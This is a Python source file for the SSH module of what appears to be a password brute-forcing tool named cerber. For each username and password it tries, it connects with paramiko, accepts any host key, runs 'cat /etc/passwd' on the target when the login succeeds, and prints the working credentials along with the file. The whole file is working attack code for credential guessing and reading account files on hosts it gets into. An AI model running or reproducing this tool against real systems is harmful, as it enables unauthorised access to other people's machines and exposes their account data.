from cerber.src.utils import CerberBase
from print_color import print

try:
    import paramiko
except:
    pass


class SshCerber(CerberBase):

    def connect(self, user: str, passwd: str, timeout: float):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=self.host, username=user, password=passwd, port=self.port, timeout=timeout)
            stdin, stdout, stderr = client.exec_command('cat /etc/passwd')
            data = stdout.read() + stderr.read()
            client.close()
            print(f"{user}:{passwd}\n----------/etc/passwd----------{data}\n\n", tag='success', tag_color='green')
            return data
        except Exception as e:
            if self.debug:
                print(f"{user}:{passwd}", tag='fail', tag_color='red')
            return None
